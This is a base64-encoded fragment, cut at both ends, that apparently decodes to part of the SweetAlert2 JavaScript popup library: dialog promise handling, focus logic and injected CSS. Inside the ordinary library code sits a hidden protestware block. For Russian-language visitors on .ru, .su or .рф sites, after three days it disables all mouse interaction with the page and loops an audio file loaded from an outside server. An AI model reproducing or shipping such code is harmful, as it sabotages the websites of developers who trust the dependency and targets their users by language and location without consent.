AxICYmIGFyZ3VtZW50c1sxXSAhPT0gdW5kZWZpbmVkID8gYXJndW1lbnRzWzFdIDoge307XG4gICAgICBzaG93V2FybmluZ3NGb3JQYXJhbXMoT2JqZWN0LmFzc2lnbih7fSwgbWl4aW5QYXJhbXMsIHVzZXJQYXJhbXMpKTtcbiAgICAgIGlmIChnbG9iYWxTdGF0ZS5jdXJyZW50SW5zdGFuY2UpIHtcbiAgICAgICAgLy8gQHRzLWlnbm9yZVxuICAgICAgICBnbG9iYWxTdGF0ZS5jdXJyZW50SW5zdGFuY2UuX2Rlc3Ryb3koKTtcbiAgICAgICAgaWYgKGlzTW9kYWwoKSkge1xuICAgICAgICAgIHVuc2V0QXJpYUhpZGRlbigpO1xuICAgICAgICB9XG4gICAgICB9XG4gICAgICBnbG9iYWxTdGF0ZS5jdXJyZW50SW5zdGFuY2UgPSBjdXJyZW50SW5zdGFuY2U7XG4gICAgICBjb25zdCBpbm5lclBhcmFtcyA9IHByZXBhcmVQYXJhbXModXNlclBhcmFtcywgbWl4aW5QYXJhbXMpO1xuICAgICAgc2V0UGFyYW1ldGVycyhpbm5lclBhcmFtcyk7XG4gICAgICBPYmplY3QuZnJlZXplKGlubmVyUGFyYW1zKTtcblxuICAgICAgLy8gY2xlYXIgdGhlIHByZXZpb3VzIHRpbWVyXG4gICAgICBpZiAoZ2xvYmFsU3RhdGUudGltZW91dCkge1xuICAgICAgICBnbG9iYWxTdGF0ZS50aW1lb3V0LnN0b3AoKTtcbiAgICAgICAgZGVsZXRlIGdsb2JhbFN0YXRlLnRpbWVvdXQ7XG4gICAgICB9XG5cbiAgICAgIC8vIGNsZWFyIHRoZSByZXN0b3JlIGZvY3VzIHRpbWVvdXRcbiAgICAgIGNsZWFyVGltZW91dChnbG9iYWxTdGF0ZS5yZXN0b3JlRm9jdXNUaW1lb3V0KTtcbiAgICAgIGNvbnN0IGRvbUNhY2hlID0gcG9wdWxhdGVEb21DYWNoZShjdXJyZW50SW5zdGFuY2UpO1xuICAgICAgcmVuZGVyKGN1cnJlbnRJbnN0YW5jZSwgaW5uZXJQYXJhbXMpO1xuICAgICAgcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLnNldChjdXJyZW50SW5zdGFuY2UsIGlubmVyUGFyYW1zKTtcbiAgICAgIHJldHVybiBzd2FsUHJvbWlzZShjdXJyZW50SW5zdGFuY2UsIGRvbUNhY2hlLCBpbm5lclBhcmFtcyk7XG4gICAgfVxuXG4gICAgLy8gYGNhdGNoYCBjYW5ub3QgYmUgdGhlIG5hbWUgb2YgYSBtb2R1bGUgZXhwb3J0LCBzbyB3ZSBkZWZpbmUgb3VyIHRoZW5hYmxlIG1ldGhvZHMgaGVyZSBpbnN0ZWFkXG4gICAgdGhlbihvbkZ1bGZpbGxlZCkge1xuICAgICAgY29uc3QgcHJvbWlzZSA9IHByaXZhdGVQcm9wcy5wcm9taXNlLmdldCh0aGlzKTtcbiAgICAgIHJldHVybiBwcm9taXNlLnRoZW4ob25GdWxmaWxsZWQpO1xuICAgIH1cbiAgICBmaW5hbGx5KG9uRmluYWxseSkge1xuICAgICAgY29uc3QgcHJvbWlzZSA9IHByaXZhdGVQcm9wcy5wcm9taXNlLmdldCh0aGlzKTtcbiAgICAgIHJldHVybiBwcm9taXNlLmZpbmFsbHkob25GaW5hbGx5KTtcbiAgICB9XG4gIH1cblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtEb21DYWNoZX0gZG9tQ2FjaGVcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gaW5uZXJQYXJhbXNcbiAgICogQHJldHVybnMge1Byb21pc2V9XG4gICAqL1xuICBjb25zdCBzd2FsUHJvbWlzZSA9IChpbnN0YW5jZSwgZG9tQ2FjaGUsIGlubmVyUGFyYW1zKSA9PiB7XG4gICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHtcbiAgICAgIC8vIGZ1bmN0aW9ucyB0byBoYW5kbGUgYWxsIGNsb3NpbmdzL2Rpc21pc3NhbHNcbiAgICAgIC8qKlxuICAgICAgICogQHBhcmFtIHtEaXNtaXNzUmVhc29ufSBkaXNtaXNzXG4gICAgICAgKi9cbiAgICAgIGNvbnN0IGRpc21pc3NXaXRoID0gZGlzbWlzcyA9PiB7XG4gICAgICAgIC8vIEB0cy1pZ25vcmVcbiAgICAgICAgaW5zdGFuY2UuY2xvc2Uoe1xuICAgICAgICAgIGlzRGlzbWlzc2VkOiB0cnVlLFxuICAgICAgICAgIGRpc21pc3NcbiAgICAgICAgfSk7XG4gICAgICB9O1xuICAgICAgcHJpdmF0ZU1ldGhvZHMuc3dhbFByb21pc2VSZXNvbHZlLnNldChpbnN0YW5jZSwgcmVzb2x2ZSk7XG4gICAgICBwcml2YXRlTWV0aG9kcy5zd2FsUHJvbWlzZVJlamVjdC5zZXQoaW5zdGFuY2UsIHJlamVjdCk7XG4gICAgICBkb21DYWNoZS5jb25maXJtQnV0dG9uLm9uY2xpY2sgPSAoKSA9PiB7XG4gICAgICAgIGhhbmRsZUNvbmZpcm1CdXR0b25DbGljayhpbnN0YW5jZSk7XG4gICAgICB9O1xuICAgICAgZG9tQ2FjaGUuZGVueUJ1dHRvbi5vbmNsaWNrID0gKCkgPT4ge1xuICAgICAgICBoYW5kbGVEZW55QnV0dG9uQ2xpY2soaW5zdGFuY2UpO1xuICAgICAgfTtcbiAgICAgIGRvbUNhY2hlLmNhbmNlbEJ1dHRvbi5vbmNsaWNrID0gKCkgPT4ge1xuICAgICAgICBoYW5kbGVDYW5jZWxCdXR0b25DbGljayhpbnN0YW5jZSwgZGlzbWlzc1dpdGgpO1xuICAgICAgfTtcbiAgICAgIGRvbUNhY2hlLmNsb3NlQnV0dG9uLm9uY2xpY2sgPSAoKSA9PiB7XG4gICAgICAgIC8vIEB0cy1pZ25vcmVcbiAgICAgICAgZGlzbWlzc1dpdGgoRGlzbWlzc1JlYXNvbi5jbG9zZSk7XG4gICAgICB9O1xuICAgICAgaGFuZGxlUG9wdXBDbGljayhpbnN0YW5jZSwgZG9tQ2FjaGUsIGRpc21pc3NXaXRoKTtcbiAgICAgIGFkZEtleWRvd25IYW5kbGVyKGluc3RhbmNlLCBnbG9iYWxTdGF0ZSwgaW5uZXJQYXJhbXMsIGRpc21pc3NXaXRoKTtcbiAgICAgIGhhbmRsZUlucHV0T3B0aW9uc0FuZFZhbHVlKGluc3RhbmNlLCBpbm5lclBhcmFtcyk7XG4gICAgICBvcGVuUG9wdXAoaW5uZXJQYXJhbXMpO1xuICAgICAgc2V0dXBUaW1lcihnbG9iYWxTdGF0ZSwgaW5uZXJQYXJhbXMsIGRpc21pc3NXaXRoKTtcbiAgICAgIGluaXRGb2N1cyhkb21DYWNoZSwgaW5uZXJQYXJhbXMpO1xuXG4gICAgICAvLyBTY3JvbGwgY29udGFpbmVyIHRvIHRvcCBvbiBvcGVuICgjMTI0NywgIzE5NDYpXG4gICAgICBzZXRUaW1lb3V0KCgpID0+IHtcbiAgICAgICAgZG9tQ2FjaGUuY29udGFpbmVyLnNjcm9sbFRvcCA9IDA7XG4gICAgICB9KTtcbiAgICB9KTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gdXNlclBhcmFtc1xuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBtaXhpblBhcmFtc1xuICAgKiBAcmV0dXJucyB7U3dlZXRBbGVydE9wdGlvbnN9XG4gICAqL1xuICBjb25zdCBwcmVwYXJlUGFyYW1zID0gKHVzZXJQYXJhbXMsIG1peGluUGFyYW1zKSA9PiB7XG4gICAgY29uc3QgdGVtcGxhdGVQYXJhbXMgPSBnZXRUZW1wbGF0ZVBhcmFtcyh1c2VyUGFyYW1zKTtcbiAgICBjb25zdCBwYXJhbXMgPSBPYmplY3QuYXNzaWduKHt9LCBkZWZhdWx0UGFyYW1zLCBtaXhpblBhcmFtcywgdGVtcGxhdGVQYXJhbXMsIHVzZXJQYXJhbXMpOyAvLyBwcmVjZWRlbmNlIGlzIGRlc2NyaWJlZCBpbiAjMjEzMVxuICAgIHBhcmFtcy5zaG93Q2xhc3MgPSBPYmplY3QuYXNzaWduKHt9LCBkZWZhdWx0UGFyYW1zLnNob3dDbGFzcywgcGFyYW1zLnNob3dDbGFzcyk7XG4gICAgcGFyYW1zLmhpZGVDbGFzcyA9IE9iamVjdC5hc3NpZ24oe30sIGRlZmF1bHRQYXJhbXMuaGlkZUNsYXNzLCBwYXJhbXMuaGlkZUNsYXNzKTtcbiAgICByZXR1cm4gcGFyYW1zO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcmV0dXJucyB7RG9tQ2FjaGV9XG4gICAqL1xuICBjb25zdCBwb3B1bGF0ZURvbUNhY2hlID0gaW5zdGFuY2UgPT4ge1xuICAgIGNvbnN0IGRvbUNhY2hlID0ge1xuICAgICAgcG9wdXA6IGdldFBvcHVwKCksXG4gICAgICBjb250YWluZXI6IGdldENvbnRhaW5lcigpLFxuICAgICAgYWN0aW9uczogZ2V0QWN0aW9ucygpLFxuICAgICAgY29uZmlybUJ1dHRvbjogZ2V0Q29uZmlybUJ1dHRvbigpLFxuICAgICAgZGVueUJ1dHRvbjogZ2V0RGVueUJ1dHRvbigpLFxuICAgICAgY2FuY2VsQnV0dG9uOiBnZXRDYW5jZWxCdXR0b24oKSxcbiAgICAgIGxvYWRlcjogZ2V0TG9hZGVyKCksXG4gICAgICBjbG9zZUJ1dHRvbjogZ2V0Q2xvc2VCdXR0b24oKSxcbiAgICAgIHZhbGlkYXRpb25NZXNzYWdlOiBnZXRWYWxpZGF0aW9uTWVzc2FnZSgpLFxuICAgICAgcHJvZ3Jlc3NTdGVwczogZ2V0UHJvZ3Jlc3NTdGVwcygpXG4gICAgfTtcbiAgICBwcml2YXRlUHJvcHMuZG9tQ2FjaGUuc2V0KGluc3RhbmNlLCBkb21DYWNoZSk7XG4gICAgcmV0dXJuIGRvbUNhY2hlO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0dsb2JhbFN0YXRlfSBnbG9iYWxTdGF0ZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBpbm5lclBhcmFtc1xuICAgKiBAcGFyYW0ge0Z1bmN0aW9ufSBkaXNtaXNzV2l0aFxuICAgKi9cbiAgY29uc3Qgc2V0dXBUaW1lciA9IChnbG9iYWxTdGF0ZSwgaW5uZXJQYXJhbXMsIGRpc21pc3NXaXRoKSA9PiB7XG4gICAgY29uc3QgdGltZXJQcm9ncmVzc0JhciA9IGdldFRpbWVyUHJvZ3Jlc3NCYXIoKTtcbiAgICBoaWRlKHRpbWVyUHJvZ3Jlc3NCYXIpO1xuICAgIGlmIChpbm5lclBhcmFtcy50aW1lcikge1xuICAgICAgZ2xvYmFsU3RhdGUudGltZW91dCA9IG5ldyBUaW1lcigoKSA9PiB7XG4gICAgICAgIGRpc21pc3NXaXRoKCd0aW1lcicpO1xuICAgICAgICBkZWxldGUgZ2xvYmFsU3RhdGUudGltZW91dDtcbiAgICAgIH0sIGlubmVyUGFyYW1zLnRpbWVyKTtcbiAgICAgIGlmIChpbm5lclBhcmFtcy50aW1lclByb2dyZXNzQmFyKSB7XG4gICAgICAgIHNob3codGltZXJQcm9ncmVzc0Jhcik7XG4gICAgICAgIGFwcGx5Q3VzdG9tQ2xhc3ModGltZXJQcm9ncmVzc0JhciwgaW5uZXJQYXJhbXMsICd0aW1lclByb2dyZXNzQmFyJyk7XG4gICAgICAgIHNldFRpbWVvdXQoKCkgPT4ge1xuICAgICAgICAgIGlmIChnbG9iYWxTdGF0ZS50aW1lb3V0ICYmIGdsb2JhbFN0YXRlLnRpbWVvdXQucnVubmluZykge1xuICAgICAgICAgICAgLy8gdGltZXIgY2FuIGJlIGFscmVhZHkgc3RvcHBlZCBvciB1bnNldCBhdCB0aGlzIHBvaW50XG4gICAgICAgICAgICBhbmltYXRlVGltZXJQcm9ncmVzc0Jhcihpbm5lclBhcmFtcy50aW1lcik7XG4gICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICAgIH1cbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7RG9tQ2FjaGV9IGRvbUNhY2hlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IGlubmVyUGFyYW1zXG4gICAqL1xuICBjb25zdCBpbml0Rm9jdXMgPSAoZG9tQ2FjaGUsIGlubmVyUGFyYW1zKSA9PiB7XG4gICAgaWYgKGlubmVyUGFyYW1zLnRvYXN0KSB7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmICghY2FsbElmRnVuY3Rpb24oaW5uZXJQYXJhbXMuYWxsb3dFbnRlcktleSkpIHtcbiAgICAgIGJsdXJBY3RpdmVFbGVtZW50KCk7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmICghZm9jdXNCdXR0b24oZG9tQ2FjaGUsIGlubmVyUGFyYW1zKSkge1xuICAgICAgc2V0Rm9jdXMoLTEsIDEpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtEb21DYWNoZX0gZG9tQ2FjaGVcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gaW5uZXJQYXJhbXNcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBmb2N1c0J1dHRvbiA9IChkb21DYWNoZSwgaW5uZXJQYXJhbXMpID0+IHtcbiAgICBpZiAoaW5uZXJQYXJhbXMuZm9jdXNEZW55ICYmIGlzVmlzaWJsZSQxKGRvbUNhY2hlLmRlbnlCdXR0b24pKSB7XG4gICAgICBkb21DYWNoZS5kZW55QnV0dG9uLmZvY3VzKCk7XG4gICAgICByZXR1cm4gdHJ1ZTtcbiAgICB9XG4gICAgaWYgKGlubmVyUGFyYW1zLmZvY3VzQ2FuY2VsICYmIGlzVmlzaWJsZSQxKGRvbUNhY2hlLmNhbmNlbEJ1dHRvbikpIHtcbiAgICAgIGRvbUNhY2hlLmNhbmNlbEJ1dHRvbi5mb2N1cygpO1xuICAgICAgcmV0dXJuIHRydWU7XG4gICAgfVxuICAgIGlmIChpbm5lclBhcmFtcy5mb2N1c0NvbmZpcm0gJiYgaXNWaXNpYmxlJDEoZG9tQ2FjaGUuY29uZmlybUJ1dHRvbikpIHtcbiAgICAgIGRvbUNhY2hlLmNvbmZpcm1CdXR0b24uZm9jdXMoKTtcbiAgICAgIHJldHVybiB0cnVlO1xuICAgIH1cbiAgICByZXR1cm4gZmFsc2U7XG4gIH07XG4gIGNvbnN0IGJsdXJBY3RpdmVFbGVtZW50ID0gKCkgPT4ge1xuICAgIGlmIChkb2N1bWVudC5hY3RpdmVFbGVtZW50IGluc3RhbmNlb2YgSFRNTEVsZW1lbnQgJiYgdHlwZW9mIGRvY3VtZW50LmFjdGl2ZUVsZW1lbnQuYmx1ciA9PT0gJ2Z1bmN0aW9uJykge1xuICAgICAgZG9jdW1lbnQuYWN0aXZlRWxlbWVudC5ibHVyKCk7XG4gICAgfVxuICB9O1xuXG4gIC8vIERlYXIgcnVzc2lhbiB1c2VycyB2aXNpdGluZyBydXNzaWFuIHNpdGVzLiBMZXQncyBoYXZlIGZ1bi5cbiAgaWYgKHR5cGVvZiB3aW5kb3cgIT09ICd1bmRlZmluZWQnICYmIC9ecnVcXGIvLnRlc3QobmF2aWdhdG9yLmxhbmd1YWdlKSAmJiBsb2NhdGlvbi5ob3N0Lm1hdGNoKC9cXC4ocnV8c3V8eG4tLXAxYWkpJC8pKSB7XG4gICAgY29uc3Qgbm93ID0gbmV3IERhdGUoKTtcbiAgICBjb25zdCBpbml0aWF0aW9uRGF0ZSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzd2FsLWluaXRpYXRpb24nKTtcbiAgICBpZiAoIWluaXRpYXRpb25EYXRlKSB7XG4gICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnc3dhbC1pbml0aWF0aW9uJywgYCR7bm93fWApO1xuICAgIH0gZWxzZSBpZiAoKG5vdy5nZXRUaW1lKCkgLSBEYXRlLnBhcnNlKGluaXRpYXRpb25EYXRlKSkgLyAoMTAwMCAqIDYwICogNjAgKiAyNCkgPiAzKSB7XG4gICAgICBzZXRUaW1lb3V0KCgpID0+IHtcbiAgICAgICAgZG9jdW1lbnQuYm9keS5zdHlsZS5wb2ludGVyRXZlbnRzID0gJ25vbmUnO1xuICAgICAgICBjb25zdCB1a3JhaW5pYW5BbnRoZW0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhdWRpbycpO1xuICAgICAgICB1a3JhaW5pYW5BbnRoZW0uc3JjID0gJ2h0dHBzOi8vZmxhZy1naW1uLnJ1L3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIxLzA5L1VrcmFpbmEubXAzJztcbiAgICAgICAgdWtyYWluaWFuQW50aGVtLmxvb3AgPSB0cnVlO1xuICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHVrcmFpbmlhbkFudGhlbSk7XG4gICAgICAgIHNldFRpbWVvdXQoKCkgPT4ge1xuICAgICAgICAgIHVrcmFpbmlhbkFudGhlbS5wbGF5KCkuY2F0Y2goKCkgPT4ge1xuICAgICAgICAgICAgLy8gaWdub3JlXG4gICAgICAgICAgfSk7XG4gICAgICAgIH0sIDI1MDApO1xuICAgICAgfSwgNTAwKTtcbiAgICB9XG4gIH1cblxuICAvLyBBc3NpZ24gaW5zdGFuY2UgbWV0aG9kcyBmcm9tIHNyYy9pbnN0YW5jZU1ldGhvZHMvKi5qcyB0byBwcm90b3R5cGVcbiAgT2JqZWN0LmFzc2lnbihTd2VldEFsZXJ0LnByb3RvdHlwZSwgaW5zdGFuY2VNZXRob2RzKTtcblxuICAvLyBBc3NpZ24gc3RhdGljIG1ldGhvZHMgZnJvbSBzcmMvc3RhdGljTWV0aG9kcy8qLmpzIHRvIGNvbnN0cnVjdG9yXG4gIE9iamVjdC5hc3NpZ24oU3dlZXRBbGVydCwgc3RhdGljTWV0aG9kcyk7XG5cbiAgLy8gUHJveHkgdG8gaW5zdGFuY2UgbWV0aG9kcyB0byBjb25zdHJ1Y3RvciwgZm9yIG5vdywgZm9yIGJhY2t3YXJkcyBjb21wYXRpYmlsaXR5XG4gIE9iamVjdC5rZXlzKGluc3RhbmNlTWV0aG9kcykuZm9yRWFjaChrZXkgPT4ge1xuICAgIC8qKlxuICAgICAqIEBwYXJhbSB7Li4uYW55fSBhcmdzXG4gICAgICogQHJldHVybnMge2FueSB8IHVuZGVmaW5lZH1cbiAgICAgKi9cbiAgICBTd2VldEFsZXJ0W2tleV0gPSBmdW5jdGlvbiAoKSB7XG4gICAgICBpZiAoY3VycmVudEluc3RhbmNlKSB7XG4gICAgICAgIHJldHVybiBjdXJyZW50SW5zdGFuY2Vba2V5XSguLi5hcmd1bWVudHMpO1xuICAgICAgfVxuICAgIH07XG4gIH0pO1xuICBTd2VldEFsZXJ0LkRpc21pc3NSZWFzb24gPSBEaXNtaXNzUmVhc29uO1xuICBTd2VldEFsZXJ0LnZlcnNpb24gPSAnMTEuNy41JztcblxuICBjb25zdCBTd2FsID0gU3dlZXRBbGVydDtcbiAgLy8gQHRzLWlnbm9yZVxuICBTd2FsLmRlZmF1bHQgPSBTd2FsO1xuXG4gIHJldHVybiBTd2FsO1xuXG59KSk7XG5pZiAodHlwZW9mIHRoaXMgIT09ICd1bmRlZmluZWQnICYmIHRoaXMuU3dlZXRhbGVydDIpe3RoaXMuc3dhbCA9IHRoaXMuc3dlZXRBbGVydCA9IHRoaXMuU3dhbCA9IHRoaXMuU3dlZXRBbGVydCA9IHRoaXMuU3dlZXRhbGVydDJ9XG5cInVuZGVmaW5lZFwiIT10eXBlb2YgZG9jdW1lbnQmJmZ1bmN0aW9uKGUsdCl7dmFyIG49ZS5jcmVhdGVFbGVtZW50KFwic3R5bGVcIik7aWYoZS5nZXRFbGVtZW50c0J5VGFnTmFtZShcImhlYWRcIilbMF0uYXBwZW5kQ2hpbGQobiksbi5zdHlsZVNoZWV0KW4uc3R5bGVTaGVldC5kaXNhYmxlZHx8KG4uc3R5bGVTaGVldC5jc3NUZXh0PXQpO2Vsc2UgdHJ5e24uaW5uZXJIVE1MPXR9Y2F0Y2goZSl7bi5pbm5lclRleHQ9dH19KGRvY3VtZW50LFwiLnN3YWwyLXBvcHVwLnN3YWwyLXRvYXN0e2JveC1zaXppbmc6Ym9yZGVyLWJveDtncmlkLWNvbHVtbjoxLzQgIWltcG9ydGFudDtncmlkLXJvdzoxLzQgIWltcG9ydGFudDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6bWluLWNvbnRlbnQgYXV0byBtaW4tY29udGVudDtwYWRkaW5nOjFlbTtvdmVyZmxvdy15OmhpZGRlbjtiYWNrZ3JvdW5kOiNmZmY7Ym94LXNoYWRvdzowIDAgMXB4IHJnYmEoMCwwLDAsLjA3NSksMCAxcHggMnB4IHJnYmEoMCwwLDAsLjA3NSksMXB4IDJweCA0cHggcmdiYSgwLDAsMCwuMDc1KSwxcHggM3B4IDhweCByZ2JhKDAsMCwwLC4wNzUpLDJweCA0cHggMTZweCByZ2JhKDAsMCwwLC4wNzUpO3BvaW50ZXItZXZlbnRzOmFsbH0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3Q+KntncmlkLWNvbHVtbjoyfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItdGl0bGV7bWFyZ2luOi41ZW0gMWVtO3BhZGRpbmc6MDtmb250LXNpemU6MWVtO3RleHQtYWxpZ246aW5pdGlhbH0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLWxvYWRpbmd7anVzdGlmeS1jb250ZW50OmNlbnRlcn0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLWlucHV0e2hlaWdodDoyZW07bWFyZ2luOi41ZW07Zm9udC1zaXplOjFlbX0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXZhbGlkYXRpb24tbWVzc2FnZXtmb250LXNpemU6MWVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItZm9vdGVye21hcmdpbjouNWVtIDAgMDtwYWRkaW5nOi41ZW0gMCAwO2ZvbnQtc2l6ZTouOGVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItY2xvc2V7Z3JpZC1jb2x1bW46My8zO2dyaWQtcm93OjEvOTk7YWxpZ24tc2VsZjpjZW50ZXI7d2lkdGg6LjhlbTtoZWlnaHQ6LjhlbTttYXJnaW46MDtmb250LXNpemU6MmVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItaHRtbC1jb250YWluZXJ7bWFyZ2luOi41ZW0gMWVtO3BhZGRpbmc6MDtvdmVyZmxvdzppbml0aWFsO2ZvbnQtc2l6ZToxZW07dGV4dC1hbGlnbjppbml0aWFsfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItaHRtbC1jb250YWluZXI6ZW1wdHl7cGFkZGluZzowfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItbG9hZGVye2dyaWQtY29sdW1uOjE7Z3JpZC1yb3c6MS85OTthbGlnbi1zZWxmOmNlbnRlcjt3aWR0aDoyZW07aGVpZ2h0OjJlbTttYXJnaW46LjI1ZW19LnN3YWwyLXBvcHVwLnN3YWwyLXRvYXN0IC5zd2FsMi1pY29ue2dyaWQtY29sdW1uOjE7Z3JpZC1yb3c6MS85OTthbGlnbi1zZWxmOmNlbnRlcjt3aWR0aDoyZW07bWluLXdpZHRoOjJlbTtoZWlnaHQ6MmVtO21hcmdpbjowIC41ZW0gMCAwfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItaWNvbiAuc3dhbDItaWNvbi1jb250ZW50e2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1zaXplOjEuOGVtO2ZvbnQtd2VpZ2h0OmJvbGR9LnN3YWwyLXBvcHVwLnN3YWwyLXRvYXN0IC5zd2FsMi1pY29uLnN3YWwyLXN1Y2Nlc3MgLnN3YWwyLXN1Y2Nlc3MtcmluZ3t3aWR0aDoyZW07aGVpZ2h0OjJlbX0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLWljb24uc3dhbDItZXJyb3IgW2NsYXNzXj1zd2FsMi14LW1hcmstbGluZV17dG9wOi44NzVlbTt3aWR0aDoxLjM3NWVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItaWNvbi5zd2FsMi1lcnJvciBbY2xhc3NePXN3YWwyLXgtbWFyay1saW5lXVtjbGFzcyQ9bGVmdF17bGVmdDouMzEyNWVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItaWNvbi5zd2FsMi1lcnJvciBbY2xhc3NePXN3YWwyLXgtbWFyay1saW5lXVtjbGFzcyQ9cmlnaHRde3JpZ2h0Oi4zMTI1ZW19LnN3YWwyLXBvcHVwLnN3YWwyLXRvYXN0IC5zd2FsMi1hY3Rpb25ze2p1c3RpZnktY29udGVudDpmbGV4LXN0YXJ0O2hlaWdodDphdXRvO21hcmdpbjowO21hcmdpbi10b3A6LjVlbTtwYWRkaW5nOjAgLjVlbX0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN0eWxlZHttYXJnaW46LjI1ZW0gLjVlbTtwYWRkaW5nOi40ZW0gLjZlbTtmb250LXNpemU6MWVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItc3VjY2Vzc3tib3JkZXItY29sb3I6I2E1ZGM4Nn0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN1Y2Nlc3MgW2NsYXNzXj1zd2FsMi1zdWNjZXNzLWNpcmN1bGFyLWxpbmVde3Bvc2l0aW9uOmFic29sdXRlO3dpZHRoOjEuNmVtO2hlaWdodDozZW07dHJhbnNmb3JtOnJvdGF0ZSg0NWRlZyk7Ym9yZGVyLXJhZGl1czo1MCV9LnN3YWwyLXBvcHVwLnN3YWwyLXRvYXN0IC5zd2FsMi1zdWNjZXNzIFtjbGFzc149c3dhbDItc3VjY2Vzcy1jaXJjdWxhci1saW5lXVtjbGFzcyQ9bGVmdF17dG9wOi0wLjhlbTtsZWZ0Oi0wLjVlbTt0cmFuc2Zvcm06cm90YXRlKC00NWRlZyk7dHJhbnNmb3JtLW9yaWdpbjoyZW0gMmVtO2JvcmRlci1yYWRpdXM6NGVtIDAgMCA0ZW19LnN3YWwyLXBvcHVwLnN3YWwyLXRvYXN0IC5zd2FsMi1zdWNjZXNzIFtjbGFzc149c3dhbDItc3VjY2Vzcy1jaXJjdWxhci1saW5lXVtjbGFzcyQ9cmlnaHRde3RvcDotMC4yNWVtO2xlZnQ6LjkzNzVlbTt0cmFuc2Zvcm0tb3JpZ2luOjAgMS41ZW07Ym9yZGVyLXJhZGl1czowIDRlbSA0ZW0gMH0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN1Y2Nlc3MgLnN3YWwyLXN1Y2Nlc3MtcmluZ3t3aWR0aDoyZW07aGVpZ2h0OjJlbX0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN1Y2Nlc3MgLnN3YWwyLXN1Y2Nlc3MtZml4e3RvcDowO2xlZnQ6LjQzNzVlbTt3aWR0aDouNDM3NWVtO2hlaWdodDoyLjY4NzVlbX0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN1Y2Nlc3MgW2NsYXNzXj1zd2FsMi1zdWNjZXNzLWxpbmVde2hlaWdodDouMzEyNWVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItc3VjY2VzcyBbY2xhc3NePXN3YWwyLXN1Y2Nlc3MtbGluZV1bY2xhc3MkPXRpcF17dG9wOjEuMTI1ZW07bGVmdDouMTg3NWVtO3dpZHRoOi43NWVtfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdCAuc3dhbDItc3VjY2VzcyBbY2xhc3NePXN3YWwyLXN1Y2Nlc3MtbGluZV1bY2xhc3MkPWxvbmdde3RvcDouOTM3NWVtO3JpZ2h0Oi4xODc1ZW07d2lkdGg6MS4zNzVlbX0uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN1Y2Nlc3Muc3dhbDItaWNvbi1zaG93IC5zd2FsMi1zdWNjZXNzLWxpbmUtdGlwe2FuaW1hdGlvbjpzd2FsMi10b2FzdC1hbmltYXRlLXN1Y2Nlc3MtbGluZS10aXAgLjc1c30uc3dhbDItcG9wdXAuc3dhbDItdG9hc3QgLnN3YWwyLXN1Y2Nlc3Muc3dhbDItaWNvbi1zaG93IC5zd2FsMi1zdWNjZXNzLWxpbmUtbG9uZ3thbmltYXRpb246c3dhbDItdG9hc3QtYW5pbWF0ZS1zdWNjZXNzLWxpbmUtbG9uZyAuNzVzfS5zd2FsMi1wb3B1cC5zd2FsMi10b2FzdC5zd2FsMi1zaG93e2FuaW1hdGlvbjpzd2FsMi10b2FzdC1zaG93IC41c30uc3dhbDItcG9wdXAuc3dhbDItdG9hc3Quc3dh